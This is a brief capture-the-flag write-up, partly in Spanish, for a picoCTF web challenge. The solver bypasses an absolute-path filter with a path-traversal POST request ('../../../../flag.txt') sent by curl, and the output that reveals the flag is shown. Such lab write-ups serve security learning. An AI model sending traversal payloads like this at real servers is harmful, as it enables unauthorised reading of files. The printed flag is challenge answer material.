# Ejercicios de tarea

## Descripcion

Can you get the flag? Here's the [website](http://saturn.picoctf.net:55827/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?

## Pistas (Si hay)



## Solución

``` Bash

No encontraba forma de solucionarlo y me base en el video de referencias para poder terminarlo

┌──(kali㉿kali)-[~]
└─$ curl -X POST http://saturn.picoctf.net:55827/read.php --data "filename=../../../../flag.txt"
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Web eReader</title>
  </head>
  <body>
    
    picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}<br>  </body>
</html>

```

## Referencias

https://www.youtube.com/watch?v=dwuC2TpzJ7k